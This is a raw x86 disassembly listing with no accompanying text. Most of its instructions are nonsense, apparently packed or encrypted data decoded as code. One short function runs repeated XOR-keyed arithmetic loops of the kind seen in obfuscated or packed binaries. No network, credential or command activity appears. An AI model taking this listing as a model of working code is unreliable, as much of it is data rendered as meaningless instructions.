  4207ae:	(bad)  
  4207af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207b0:	cwde   
  4207b1:	arpl   bp,bx
  4207b3:	dec    ebp
  4207b4:	xchg   ecx,eax
  4207b5:	outs   dx,DWORD PTR ds:[esi]
  4207b6:	inc    edi
  4207b7:	outs   dx,BYTE PTR ds:[esi]
  4207b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207b9:	popf   
  4207ba:	int3   
  4207bb:	adc    al,0x69
  4207bd:	sub    DWORD PTR [edi],edi
  4207bf:	pushf  
  4207c0:	(bad)  
  4207c1:	xor    DWORD PTR [ecx+0x33],ebp
  4207c4:	push   cs
  4207c5:	or     al,0x9e
  4207c7:	dec    ebx
  4207c8:	pop    edi
  4207c9:	mov    ds:0xc89bed21,eax
  4207ce:	jmp    0x5f4b:0xe4afe68f
  4207d5:	push   es
  4207d6:	jmp    0x38ecad
  4207db:	cli    
  4207dc:	aaa    
  4207dd:	frstor [ebx-0x3e]
  4207e0:	inc    eax
  4207e1:	cmp    al,BYTE PTR [edx+esi*4-0x3ad9bc57]
  4207e8:	cmp    cl,al
  4207ea:	(bad)  
  4207eb:	pusha  
  4207ec:	in     eax,dx
  4207ed:	cwde   
  4207ee:	push   ecx
  4207ef:	push   ecx
  4207f0:	not    DWORD PTR [ecx+esi*8+0x76c46190]
  4207f7:	xchg   edx,eax
  4207f8:	je     0x420838
  4207fa:	cwde   
  4207fb:	stos   BYTE PTR es:[edi],al
  4207fc:	jo     0x4207b8
  4207fe:	loop   0x42080e
  420800:	jecxz  0x4207b0
  420802:	add    bl,BYTE PTR [esi]
  420804:	es adc eax,0x44d35f3a
  42080a:	jb     0x420794
  42080c:	sbb    dh,BYTE PTR [ebp+0x3d]
  42080f:	clc    
  420810:	lods   eax,DWORD PTR ds:[esi]
  420811:	cdq    
  420812:	sti    
  420813:	std    
  420814:	pop    ecx
  420815:	mov    al,0xc3
  420817:	jns    0x42087f
  420819:	jecxz  0x4207bd
  42081b:	or     cl,BYTE PTR [ecx-0x48]
  42081e:	cdq    
  42081f:	shr    BYTE PTR [edi+eax*4+0x46],cl
  420823:	daa    
  420824:	sbb    BYTE PTR [ebp+0x0],bh
  420827:	or     al,0x92
  420829:	inc    esp
  42082a:	xor    DWORD PTR [ebx-0x43],0x2e82df96
  420831:	call   0xd073:0x5ba5d532
  420838:	push   esp
  420839:	mov    bh,0x9e
  42083b:	fisub  WORD PTR [ebx-0x2bdb1f0]
  420841:	jnp    0x4207ec
  420843:	dec    edx
  420844:	enter  0xfce3,0x53
  420848:	and    BYTE PTR [eax+0x4b],bl
  42084b:	aad    0x99
  42084d:	xor    ch,BYTE PTR [esi-0x62]
  420850:	push   ds
  420851:	rcl    BYTE PTR [eax],cl
  420853:	jle    0x4208ac
  420855:	xchg   ecx,eax
  420856:	lahf   
  420857:	aad    0xab
  420859:	add    DWORD PTR [esi+0x7b64f2eb],eax
  42085f:	add    BYTE PTR [esi],cl
  420861:	push   ss
  420862:	outs   dx,BYTE PTR ds:[esi]
  420863:	in     eax,dx
  420864:	fild   QWORD PTR [ebp+0x1b162109]
  42086a:	pop    edi
  42086b:	retf   
  42086c:	in     al,0xef
  42086e:	jns    0x420839
  420870:	mov    bh,0x76
  420872:	gs jb  0x420842
  420875:	or     ah,BYTE PTR [esi+0x6db64f30]
  42087b:	xchg   ecx,eax
  42087c:	inc    edx
  42087d:	sbb    eax,0xb5b4dd5d
  420882:	mov    edx,0x9552431b
  420887:	add    ch,ah
  420889:	xor    dh,BYTE PTR [ecx-0x2cff8c6b]
  42088f:	fs inc eax
  420891:	jmp    0x37fdc38f
  420896:	jmp    0x420869
  420898:	dec    ebp
  420899:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42089a:	or     eax,DWORD PTR [edi+0x1a]
  42089d:	imul   edi,DWORD PTR [eax],0xffffffb3
  4208a0:	pop    es
  4208a1:	xor    eax,0x6b9c8b2c
  4208a6:	and    dh,BYTE PTR [edx+0x4b]
  4208a9:	pusha  
  4208aa:	add    DWORD PTR [esi+0xd7c98b4],esi
  4208b0:	fsub   st(4),st
  4208b2:	fwait
  4208b3:	ins    DWORD PTR es:[edi],dx
  4208b4:	xor    al,0x12
  4208b6:	and    eax,0x2f28b725
  4208bb:	mov    bl,0x35
  4208bd:	adc    al,0xa
  4208bf:	sbb    ecx,eax
  4208c1:	jl     0x42084c
  4208c3:	pop    ebx
  4208c4:	cmp    esi,DWORD PTR [edi]
  4208c6:	leave  
  4208c7:	stc    
  4208c8:	inc    eax
  4208c9:	mov    cl,0x53
  4208cb:	pop    edi
  4208cc:	dec    ecx
  4208cd:	retf   0xe482
  4208d0:	mov    edx,0xe137cbb6
  4208d5:	xor    BYTE PTR [edi-0x76e6032e],ch
  4208db:	jg     0x420925
  4208dd:	pop    ss
  4208de:	fcmovnb st,st(3)
  4208e0:	cs aaa 
  4208e2:	push   ebx
  4208e3:	jg     0x4208de
  4208e5:	inc    ebx
  4208e6:	stos   DWORD PTR es:[edi],eax
  4208e7:	mov    ebp,0xee602f3e
  4208ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208ed:	cmp    BYTE PTR [edi+edx*4-0x5],bh
  4208f1:	icebp  
  4208f2:	sbb    BYTE PTR [edi+0x78207076],cl
  4208f8:	in     eax,0x87
  4208fa:	lds    edi,FWORD PTR [ebp+0x4f]
  4208fd:	mov    ch,0xcf
  4208ff:	hlt    
  420900:	and    BYTE PTR [eax+0xba48d79],bl
  420906:	adc    dl,BYTE PTR [edx+0x72ac3a5f]
  42090c:	adc    al,0x2
  42090e:	mov    cl,0xd
  420910:	cdq    
  420911:	mov    bh,0xa5
  420913:	mov    bl,0xf1
  420915:	loop   0x42090e
  420917:	push   esp
  420918:	inc    ecx
  420919:	in     eax,0xe2
  42091b:	mov    edi,0x7455cf8e
  420920:	xchg   eax,edx
  420922:	in     eax,dx
  420923:	(bad)  
  420924:	out    0x46,eax
  420926:	popf   
  420927:	in     al,dx
  420928:	cli    
  420929:	and    eax,0xa3b5b9a
  42092e:	in     al,dx
  42092f:	adc    al,0xc6
  420931:	mov    dl,0xe7
  420933:	inc    ebx
  420934:	pusha  
  420935:	add    bl,0x58
  420938:	lds    esp,FWORD PTR [ebx+0x48db1eed]
  42093e:	pop    eax
  42093f:	pop    ss
  420940:	fstp   QWORD PTR [edi+0x0]
  420943:	sub    dl,dh
  420945:	call   0xa347:0xf9dcebb
  42094c:	dec    ecx
  42094d:	jp     0x420948
  42094f:	inc    edi
  420950:	mov    al,0x88
  420952:	into   
  420953:	cmp    eax,0x5666b44a
  420958:	dec    esi
  420959:	imul   ebp,DWORD PTR [edx+ebx*8+0x779dbd72],0xf2847115
  420964:	sbb    bl,BYTE PTR [edx-0x27]
  420967:	(bad)  
  420968:	jmp    0x42092e
  42096a:	pop    ebp
  42096b:	inc    eax
  42096c:	repz sbb edx,esp
  42096f:	push   0xfffffff7
  420971:	xor    edi,esi
  420973:	xlat   BYTE PTR ds:[ebx]
  420974:	retf   
  420975:	or     dh,BYTE PTR [eax-0x65]
  420978:	ja     0x420947
  42097a:	dec    edx
  42097b:	cmp    BYTE PTR [esp+ebp*8-0x7e],dl
  42097f:	ins    DWORD PTR es:[edi],dx
  420980:	cmp    ebx,DWORD PTR [edx+0x1288610]
  420986:	sbb    eax,DWORD PTR [esi+0x1dd2dfb6]
  42098c:	add    eax,0x4a686daa
  420991:	mov    esi,0xfcdd9c47
  420996:	jp     0x42098f
  420998:	push   cs
  420999:	add    cl,BYTE PTR [esi-0x29c21821]
  42099f:	jnp    0x420a1c
  4209a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209a2:	add    edi,esp
  4209a4:	fstp   QWORD PTR [ebp+0x68]
  4209a7:	add    eax,0x3bbdf927
  4209ac:	sub    cl,BYTE PTR cs:[ebx+eiz*8-0x79]
  4209b1:	push   esp
  4209b2:	mov    cs,WORD PTR [ecx-0x25b4a5e1]
  4209b8:	mov    ds:0x8aa46673,eax
  4209bd:	mov    dl,BYTE PTR [esi]
  4209bf:	mov    edx,edx
  4209c1:	mov    fs,WORD PTR fs:[ecx]
  4209c4:	cs pop eax
  4209c6:	cld    
  4209c7:	fsub   QWORD PTR [ebx+0x54]
  4209ca:	stos   BYTE PTR es:[edi],al
  4209cb:	xor    BYTE PTR [esi-0x6f],0xad
  4209cf:	push   ecx
  4209d0:	in     eax,0x9a
  4209d2:	xchg   esi,eax
  4209d3:	lods   al,BYTE PTR ds:[esi]
  4209d4:	(bad)  
  4209d5:	ficom  DWORD PTR [ecx+ebx*4+0x7d]
  4209d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209da:	shl    BYTE PTR [edx],0xe0
  4209dd:	mov    ebp,0x8440d8d5
  4209e2:	adc    eax,0xf643058f
  4209e7:	push   esi
  4209e8:	aam    0xa7
  4209ea:	enter  0x5b41,0x8c
  4209ee:	mov    ds:0x4db32bfe,eax
  4209f3:	and    BYTE PTR ds:0x5a45aafc,ch
  4209f9:	mov    DWORD PTR [edx-0x48],0xb98f0814
  420a00:	scas   al,BYTE PTR es:[edi]
  420a01:	pop    ds
  420a02:	sbb    al,0xa8
  420a04:	mov    bh,0xf7
  420a06:	arpl   WORD PTR [edx],bp
  420a08:	ret    0xa7c4
  420a0b:	xor    eax,0x9a4327b
  420a10:	shl    BYTE PTR [eax-0x78],0xc4
  420a14:	aam    0xc3
  420a16:	idiv   eax
  420a18:	stc    
  420a19:	adc    al,0x41
  420a1b:	les    edx,FWORD PTR [edx+0x66a2ba24]
  420a21:	sti    
  420a22:	xchg   ecx,eax
  420a23:	inc    esi
  420a24:	adc    edi,DWORD PTR [eax+0x2cebcaff]
  420a2a:	mov    al,0x76
  420a2c:	pop    ds
  420a2d:	inc    esp
  420a2e:	je     0x4209dd
  420a30:	adc    al,BYTE PTR [edi+0x6cdf83ca]
  420a36:	ds hlt 
  420a38:	inc    eax
  420a39:	push   esp
  420a3a:	and    esp,DWORD PTR [edi+0x712b8d62]
  420a40:	dec    esp
  420a41:	xchg   edx,eax
  420a42:	(bad)  [ebx+edx*4+0x4d305e04]
  420a49:	push   0x35
  420a4b:	dec    esp
  420a4c:	dec    ebx
  420a4d:	adc    al,0x55
  420a4f:	rcr    BYTE PTR [ebp-0x1112e220],cl
  420a55:	sbb    bh,bh
  420a57:	dec    eax
  420a58:	stos   DWORD PTR es:[edi],eax
  420a59:	aad    0x36
  420a5b:	ret    
  420a5c:	ins    DWORD PTR es:[edi],dx
  420a5d:	xchg   ecx,eax
  420a5e:	test   BYTE PTR [ebp+ecx*2-0x1e],al
  420a62:	xlat   BYTE PTR ds:[ebx]
  420a63:	pusha  
  420a64:	cmp    DWORD PTR [ebx-0x27c252ec],esi
  420a6a:	xlat   BYTE PTR ds:[ebx]
  420a6b:	retf   
  420a6c:	call   0xf531:0x91892703
  420a73:	pop    esp
  420a74:	rcl    BYTE PTR [ecx-0x35],cl
  420a77:	push   es
  420a78:	inc    esi
  420a79:	and    DWORD PTR [esi+0x582c8b5c],ebx
  420a7f:	mov    dh,0xc6
  420a81:	loop   0x420abe
  420a83:	les    esp,FWORD PTR [ebx+0x45]
  420a86:	(bad)  
  420a88:	push   esp
  420a89:	retf   
  420a8a:	frstor [ebp+0x10]
  420a8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a8e:	gs mov cl,0x80
  420a91:	into   
  420a92:	addr16 lock mov edi,0xce8dadd2
  420a99:	int    0x56
  420a9b:	rcr    BYTE PTR ds:0x74eef451,1
  420aa1:	jbe    0x420a76
  420aa3:	loop   0x420b17
  420aa5:	test   DWORD PTR [ebx+0x2b],ebp
  420aa8:	iret   
  420aa9:	pop    edx
  420aaa:	jge    0x420b1b
  420aac:	xor    edi,DWORD PTR [eax+0x5ca81c15]
  420ab2:	push   es
  420ab3:	out    0x1b,eax
  420ab5:	mov    eax,ds:0x3a147742
  420aba:	mov    dh,0xce
  420abc:	je     0x420b04
  420abe:	pmulhw mm6,QWORD PTR [esi]
  420ac1:	retf   
  420ac2:	pushf  
  420ac3:	adc    bh,BYTE PTR [eax-0x772f0793]
  420ac9:	pop    ebx
  420aca:	ficomp WORD PTR [ebp-0x29270e31]
  420ad0:	inc    ebx
  420ad1:	push   ebx
  420ad2:	pop    esp
  420ad3:	mov    ch,0x3b
  420ad5:	mov    ebx,eax
  420ad7:	push   edx
  420ad8:	in     al,0x9b
  420ada:	and    al,0xdd
  420adc:	call   DWORD PTR es:[ebx-0x66]
  420ae0:	dec    ebp
  420ae1:	ficomp WORD PTR [ecx+0x202b61bf]
  420ae7:	adc    DWORD PTR [edx],edi
  420ae9:	enter  0xea82,0x91
  420aed:	lds    esi,FWORD PTR [esi]
  420aef:	xor    DWORD PTR [edi+0x500e3b0f],0xffffffff
  420af6:	cmp    al,BYTE PTR [ebp+edi*8+0x29a3c346]
  420afd:	xor    DWORD PTR [ebx+0x4c702470],ecx
  420b03:	inc    esp
  420b04:	push   esi
  420b05:	dec    edi
  420b06:	sbb    al,0xec
  420b08:	push   ebp
  420b09:	popa   
  420b0a:	dec    ebx
  420b0b:	cmp    BYTE PTR [eax+0x32],al
  420b0e:	ja     0x420ac6
  420b10:	dec    edi
  420b11:	xor    cl,ah
  420b13:	loop   0x420acc
  420b15:	dec    esi
  420b16:	stos   BYTE PTR es:[edi],al
  420b17:	xor    dh,BYTE PTR [eax-0x2f]
  420b1a:	push   ebp
  420b1b:	(bad)  
  420b1d:	pop    esi
  420b1e:	shl    DWORD PTR [edi+ecx*2+0x233f553a],0x19
  420b26:	pandn  mm3,QWORD PTR ds:0xac66570c
  420b2d:	add    al,BYTE PTR [eax]
  420b2f:	dec    esi
  420b30:	inc    eax
  420b31:	inc    esi
  420b32:	xor    DWORD PTR [ebp+ebp*4+0x6e3d7a96],ecx
  420b39:	xor    DWORD PTR ds:0x740d2466,edx
  420b3f:	sbb    ebx,DWORD PTR [ecx]
  420b41:	pop    esp
  420b42:	push   esp
  420b43:	hlt    
  420b44:	into   
  420b45:	shr    BYTE PTR [edi],cl
  420b47:	inc    edx
  420b48:	imul   ebp,DWORD PTR [esi+0x9],0x7165a5ad
  420b4f:	stc    
  420b50:	and    al,0xb7
  420b52:	sub    bh,BYTE PTR [ebp-0x25]
  420b55:	xchg   ebp,eax
  420b56:	bound  eax,QWORD PTR [eax+0x1d]
  420b59:	loopne 0x420b00
  420b5b:	sti    
  420b5c:	data16 fild QWORD PTR [edx-0x18]
  420b60:	mov    al,ds:0x1dbb2b25
  420b65:	add    BYTE PTR [eax-0x1f],bl
  420b68:	inc    esi
  420b69:	out    0x22,eax
  420b6b:	in     al,0x44
  420b6d:	jae    0x420bdb
  420b6f:	std    
  420b70:	jmp    FWORD PTR [edi]
  420b72:	les    esi,FWORD PTR [edi+eax*4]
  420b75:	xor    al,0xdc
  420b77:	daa    
  420b78:	ss js  0x420b46
  420b7b:	mov    DWORD PTR [edx],0xa418824b
  420b81:	inc    ecx
  420b82:	pop    ds
  420b83:	les    ecx,FWORD PTR [ebx+0x242252db]
  420b89:	mov    eax,0x7c698a59
  420b8e:	(bad)  
  420b8f:	adc    DWORD PTR [esi+0x1b],edx
  420b92:	outs   dx,DWORD PTR ds:[esi]
  420b93:	xchg   edi,eax
  420b94:	xchg   DWORD PTR [ebx+0x6b],esp
  420b97:	sub    al,0x59
  420b99:	jge    0x420bdd
  420b9b:	loopne 0x420b7f
  420b9d:	pop    ds
  420b9e:	jmp    0xd27473a3
  420ba3:	inc    eax
  420ba4:	sbb    al,0xce
  420ba6:	mov    WORD PTR [esi-0x4b],?
  420ba9:	aam    0x5c
  420bab:	xchg   ebp,eax
  420bac:	call   0x3dcb41f5
  420bb1:	mov    esp,DWORD PTR [esi+0x31]
  420bb4:	pushf  
  420bb5:	jecxz  0x420c2d
  420bb7:	sbb    eax,0x9132915
  420bbc:	cld    
  420bbd:	sub    eax,0x7aec098f
  420bc2:	push   cs
  420bc3:	(bad)  [eax-0x21]
  420bc6:	push   ss
  420bc7:	sbb    BYTE PTR [ebx-0x41],ah
  420bca:	sub    esi,DWORD PTR [eax]
  420bcc:	sbb    DWORD PTR [ecx-0x27],ecx
  420bcf:	shl    BYTE PTR [esi+0x7],0xbc
  420bd3:	adc    eax,0x77179919
  420bd8:	cli    
  420bd9:	add    cl,BYTE PTR [edi+0x28e159e9]
  420bdf:	sbb    BYTE PTR [esi],dh
  420be1:	jmp    0xc53cfd12
  420be6:	dec    ecx
  420be7:	xor    BYTE PTR [ecx],0xee
  420bea:	jno    0x420b9d
  420bec:	jns    0x420bd6
  420bee:	mov    bh,0xb0
  420bf0:	ret    0xa430
  420bf3:	sbb    BYTE PTR [edi-0x65996d17],cl
  420bf9:	(bad)  
  420bfa:	fsub   QWORD PTR [edi-0x29580db3]
  420c00:	psllw  mm0,0x31
  420c04:	mov    esp,0x441bfabd
  420c09:	ss lahf 
  420c0b:	xor    al,0xd9
  420c0d:	jecxz  0x420be4
  420c0f:	pop    ds
  420c10:	popa   
  420c11:	out    dx,al
  420c12:	iret   
  420c13:	in     al,0xde
  420c15:	pusha  
  420c16:	leave  
  420c17:	sti    
  420c18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c19:	test   DWORD PTR [eax+esi*8],edx
  420c1c:	pop    esp
  420c1d:	fldcw  WORD PTR [eax+0x4725dea0]
  420c23:	into   
  420c24:	pop    ds
  420c25:	arpl   WORD PTR [eax],ax
  420c27:	daa    
  420c28:	(bad)  
  420c29:	je     0x420c2b
  420c2b:	pop    esp
  420c2c:	cvttps2pi mm5,xmm1
  420c2f:	mov    esp,0x31f87b47
  420c34:	aam    0xa3
  420c36:	jmp    0x420ca8
  420c38:	loopne 0x420c15
  420c3a:	mov    ss,esi
  420c3c:	push   edi
  420c3d:	and    al,0xe3
  420c3f:	or     dl,bh
  420c41:	cwde   
  420c42:	test   al,0xdc
  420c44:	xlat   BYTE PTR ds:[ebx]
  420c45:	dec    esp
  420c46:	mov    cs,WORD PTR gs:[edx]
  420c49:	sbb    BYTE PTR [esi+0x41bfac2b],bl
  420c4f:	aas    
  420c50:	jmp    0x656c:0x6bfc10fd
  420c57:	fnstenv [edx+0x28931b11]
  420c5d:	pop    es
  420c5e:	nop
  420c5f:	and    DWORD PTR [ebp+0x302523a4],ecx
  420c65:	shl    DWORD PTR [esp+ecx*8],0x54
  420c69:	(bad)  
  420c6a:	repz mov ah,0x35
  420c6d:	data16 stc 
  420c6f:	mov    bh,ah
  420c71:	cmp    edx,DWORD PTR ds:0x3c46a91c
  420c77:	push   ebp
  420c78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c79:	xlat   BYTE PTR ds:[ebx]
  420c7a:	mov    dh,0x94
  420c7c:	push   ss
  420c7d:	xchg   edx,eax
  420c7e:	in     eax,dx
  420c7f:	mov    ebx,0xdc47ea9
  420c84:	push   ss
  420c85:	lea    esi,[edi-0x6207945b]
  420c8b:	dec    ecx
  420c8c:	pushf  
  420c8d:	and    ebx,edx
  420c8f:	mov    ch,BYTE PTR [ecx]
  420c91:	push   esp
  420c92:	jp     0x420cf0
  420c94:	sub    bl,BYTE PTR [eax-0x59]
  420c97:	adc    eax,0x9340316a
  420c9c:	push   ds
  420c9d:	sbb    eax,0xb44ab6e9
  420ca2:	xor    esp,ebp
  420ca4:	mov    ah,dh
  420ca6:	test   al,0x6b
  420ca8:	jge    0x420c35
  420caa:	cmc    
  420cab:	and    ebp,DWORD PTR [edi+0x4d]
  420cae:	(bad)  
  420cb0:	adc    BYTE PTR [edx],cl
  420cb2:	push   ecx
  420cb3:	popf   
  420cb4:	push   ss
  420cb5:	mov    ecx,DWORD PTR [eax]
  420cb7:	mov    esp,0x112a3dae
  420cbc:	iret   
  420cbd:	pop    es
  420cbe:	xor    edi,DWORD PTR [ecx-0x6b]
  420cc1:	xchg   ecx,eax
  420cc2:	rol    BYTE PTR [ebp+0x283da895],cl
  420cc8:	push   ebp
  420cc9:	mov    eax,ds:0x74e51f2f
  420cce:	push   0x6
  420cd0:	pop    eax
  420cd1:	push   eax
  420cd2:	lods   eax,DWORD PTR ds:[esi]
  420cd4:	pop    ss
  420cd5:	adc    DWORD PTR ds:[eax-0x4e09134c],esi
  420cdc:	leave  
  420cdd:	adc    DWORD PTR [eax+0x69370ec4],ecx
  420ce3:	imul   esp,ecx,0x4bd30f4e
  420ce9:	sbb    eax,0xfa3fb99f
  420cee:	mov    ebp,0x37332ef8
  420cf3:	xchg   ebp,eax
  420cf4:	jmp    0x420d4a
  420cf6:	sub    eax,0x559ca8cb
  420cfb:	loopne 0x420ce7
  420cfd:	leave  
  420cfe:	test   DWORD PTR [eax+0x3ce7be98],0x311cf397
  420d08:	ss mov cl,0xda
  420d0b:	pop    edx
  420d0c:	adc    DWORD PTR [ebx],esp
  420d0e:	xor    al,0x51
  420d10:	in     eax,dx
  420d11:	cmp    al,0x90
  420d13:	jae    0x420cd0
  420d15:	shl    DWORD PTR [ebx],1
  420d17:	sti    
  420d18:	mov    DWORD PTR [edx],edi
  420d1a:	mov    edx,DWORD PTR [ebp+0x8]
  420d1d:	xor    edx,eax
  420d1f:	inc    ecx
  420d20:	inc    DWORD PTR [ebp-0x18]
  420d23:	add    edx,esi
  420d25:	cmp    ecx,edx
  420d27:	jb     0x41e963
  420d2d:	jmp    0x420d77
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	mov    DWORD PTR [ebp+0x8],ecx
  420d38:	jmp    0x420d6a
  420d3d:	mov    ecx,DWORD PTR [ebp+0x8]
  420d40:	mov    edx,DWORD PTR [ebp-0x8]
  420d43:	xor    ecx,eax
  420d45:	xor    edx,eax
  420d47:	sub    ecx,edx
  420d49:	sub    ecx,esi
  420d4b:	xor    ecx,eax
  420d4d:	mov    DWORD PTR [ebp+0x8],ecx
  420d50:	mov    ecx,DWORD PTR [ebp+0x8]
  420d53:	mov    edx,DWORD PTR [ebp+0x8]
  420d56:	imul   edx,edx,0x5708f2
  420d5c:	xor    ecx,eax
  420d5e:	add    ecx,esi
  420d60:	lea    ecx,[ebp+ecx*4-0x64]
  420d64:	mov    edi,DWORD PTR [ecx]
  420d66:	add    edx,edi
  420d68:	mov    DWORD PTR [ecx],edx
  420d6a:	mov    ecx,DWORD PTR [ebp+0x8]
  420d6d:	xor    ecx,eax
  420d6f:	add    ecx,esi
  420d71:	jne    0x420d3d
  420d77:	mov    ecx,DWORD PTR [ebp-0xc]
  420d7a:	mov    DWORD PTR [ebp+0x8],ecx
  420d7d:	jmp    0x420daf
  420d82:	mov    ecx,DWORD PTR [ebp+0x8]
  420d85:	mov    edx,DWORD PTR [ebp-0x8]
  420d88:	xor    ecx,eax
  420d8a:	xor    edx,eax
  420d8c:	sub    ecx,edx
  420d8e:	sub    ecx,esi
  420d90:	xor    ecx,eax
  420d92:	mov    DWORD PTR [ebp+0x8],ecx
  420d95:	mov    ecx,DWORD PTR [ebp+0x8]
  420d98:	mov    edx,DWORD PTR [ebp+0x8]
  420d9b:	imul   edx,edx,0x5708f2
  420da1:	xor    ecx,eax
  420da3:	add    ecx,esi
  420da5:	lea    ecx,[ebp+ecx*4-0x64]
  420da9:	mov    edi,DWORD PTR [ecx]
  420dab:	add    edx,edi
  420dad:	mov    DWORD PTR [ecx],edx
  420daf:	mov    ecx,DWORD PTR [ebp+0x8]
  420db2:	xor    ecx,eax
  420db4:	add    ecx,esi
  420db6:	jne    0x420d82
  420dbc:	mov    ecx,DWORD PTR [ebp-0x8]
  420dbf:	mov    edx,DWORD PTR [ebp-0x20]
  420dc2:	xor    ecx,eax
  420dc4:	lea    ecx,[ecx+edx*1+0x3272dd]
  420dcb:	mov    DWORD PTR [ebp-0x20],ecx
  420dce:	inc    DWORD PTR [ebp+0xc]
  420dd1:	mov    ecx,DWORD PTR [ebp-0x1c]
  420dd4:	xor    ecx,eax
  420dd6:	add    ecx,esi
  420dd8:	jne    0x413678
  420dde:	jmp    0x420e67
  420de3:	mov    ecx,DWORD PTR [ebp-0xc]
  420de6:	mov    DWORD PTR [ebp+0x8],ecx
  420de9:	jmp    0x420e1b
  420dee:	mov    ecx,DWORD PTR [ebp+0x8]
  420df1:	mov    edx,DWORD PTR [ebp-0x8]
  420df4:	xor    ecx,eax
  420df6:	xor    edx,eax
  420df8:	sub    ecx,edx
  420dfa:	sub    ecx,esi
  420dfc:	xor    ecx,eax
  420dfe:	mov    DWORD PTR [ebp+0x8],ecx
  420e01:	mov    ecx,DWORD PTR [ebp+0x8]
  420e04:	mov    edx,DWORD PTR [ebp+0x8]
  420e07:	imul   edx,edx,0x5708f2
  420e0d:	xor    ecx,eax
  420e0f:	add    ecx,esi
  420e11:	lea    ecx,[ebp+ecx*4-0x64]
  420e15:	mov    edi,DWORD PTR [ecx]
  420e17:	add    edx,edi
  420e19:	mov    DWORD PTR [ecx],edx
  420e1b:	mov    ecx,DWORD PTR [ebp+0x8]
  420e1e:	xor    ecx,eax
  420e20:	add    ecx,esi
  420e22:	jne    0x420dee
  420e28:	jmp    0x420e73
  420e2d:	mov    ecx,DWORD PTR [ebp+0x8]
  420e30:	mov    edx,DWORD PTR [ebp-0x8]
  420e33:	xor    ecx,eax
  420e35:	xor    edx,eax
  420e37:	sub    ecx,edx
  420e39:	sub    ecx,esi
  420e3b:	xor    ecx,eax
  420e3d:	mov    DWORD PTR [ebp+0x8],ecx
  420e40:	mov    ecx,DWORD PTR [ebp+0x8]
  420e43:	mov    edx,DWORD PTR [ebp+0x8]
  420e46:	xor    ecx,eax
  420e48:	imul   edx,edx,0x5708f2
  420e4e:	add    ecx,esi
  420e50:	lea    ecx,[ebp+ecx*4-0x64]
  420e54:	mov    edi,DWORD PTR [ecx]
  420e56:	add    edx,edi
  420e58:	mov    DWORD PTR [ecx],edx
  420e5a:	mov    ecx,DWORD PTR [ebp+0x8]
  420e5d:	xor    ecx,eax
  420e5f:	add    ecx,esi
  420e61:	jne    0x420e2d
  420e67:	mov    ecx,DWORD PTR [ebp-0x8]
  420e6a:	xor    ecx,eax
  420e6c:	mov    eax,DWORD PTR [ebp+0x10]
  420e6f:	add    ecx,esi
  420e71:	mov    DWORD PTR [eax],ecx
  420e73:	pop    edi
  420e74:	pop    esi
  420e75:	pop    ebx
  420e76:	leave  
  420e77:	ret    0xc
  420e7a:	dec    ebp
  420e7b:	and    eax,0x55210010
  420e80:	adc    BYTE PTR [eax],al
  420e82:	call   DWORD PTR [ebp+0x10]
  420e85:	add    bh,al
  420e87:	adc    BYTE PTR ss:[eax],al
  420e8a:	cld    
  420e8b:	ins    BYTE PTR es:[edi],dx
  420e8c:	adc    BYTE PTR [eax],al
  420e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e8f:	js     0x420ea1
  420e91:	add    BYTE PTR [ebx+eiz*2],al
  420e94:	adc    BYTE PTR [eax],al
  420e96:	dec    edi
  420e97:	jae    0x420ea9
  420e99:	add    ah,bl
  420e9b:	sub    eax,0x6ed60010
  420ea0:	adc    BYTE PTR [eax],al
  420ea2:	cmp    BYTE PTR [ecx],al
  420ea4:	adc    BYTE PTR [eax],al
  420ea6:	cwde   
  420ea7:	cmovb  eax,DWORD PTR [eax]
  420eaa:	pushf  
  420eab:	cmovb  eax,DWORD PTR [eax]
  420eae:	mov    al,ds:0xa400420f
  420eb3:	cmovb  eax,DWORD PTR [eax]
  420eb6:	test   al,0xf
  420eb8:	inc    edx
  420eb9:	add    BYTE PTR [edi+ecx*1+0xfb00042],ch
  420ec0:	inc    edx
  420ec1:	add    BYTE PTR [edi+ecx*1+0x42],dh
	...
  420ed4:	dec    edx
  420ed5:	aam    0xb3
  420ed7:	dec    ebp
  420ed8:	add    BYTE PTR [eax],al
  420eda:	add    BYTE PTR [eax],al
  420edc:	add    al,BYTE PTR [eax]
  420ede:	add    BYTE PTR [eax],al
  420ee0:	cmp    eax,0xc0000000
  420ee5:	lar    eax,WORD PTR [eax]
  420ee8:	rol    BYTE PTR [ebx],0x2
  420eeb:	add    BYTE PTR [edx+0xe],al
  420eee:	adc    BYTE PTR [eax],al
  420ef0:	pop    esp
  420ef1:	sbb    edx,DWORD PTR [eax]
  420ef3:	add    BYTE PTR [ebx-0x4dffefb0],cl
  420ef9:	sub    eax,0x29930010
  420efe:	adc    BYTE PTR [eax],al
  420f00:	mov    al,ds:0x5900101f
  420f05:	push   ebp
  420f06:	adc    BYTE PTR [eax],al
  420f08:	ret    0x102d
  420f0b:	add    BYTE PTR [edx+0xe],bh
  420f0e:	inc    edx
  420f0f:	add    BYTE PTR [esi+0xe],bh
  420f12:	inc    edx
  420f13:	add    BYTE PTR [edx-0x79ffbdf2],al
  420f19:	push   cs
  420f1a:	inc    edx
  420f1b:	add    BYTE PTR [edx-0x71ffbdf2],cl
  420f21:	push   cs
  420f22:	inc    edx
  420f23:	add    BYTE PTR [edx-0x69ffbdf2],dl
  420f29:	push   cs
  420f2a:	inc    edx
  420f2b:	add    BYTE PTR [edx-0x61ffbdf2],bl
  420f31:	push   cs
  420f32:	inc    edx
  420f33:	add    BYTE PTR [edx+0x5800420e],ah
  420f39:	cmovb  eax,DWORD PTR [eax]
  420f3c:	pop    esp
  420f3d:	cmovb  eax,DWORD PTR [eax]
  420f40:	pusha  
  420f41:	cmovb  eax,DWORD PTR [eax]
  420f44:	cmovb  eax,DWORD PTR fs:[eax]
  420f48:	push   0x6c00420f
  420f4d:	cmovb  eax,DWORD PTR [eax]
  420f50:	jo     0x420f61
  420f52:	inc    edx
  420f53:	add    BYTE PTR [edi+ecx*1+0x42],dh
  420f57:	add    al,cl
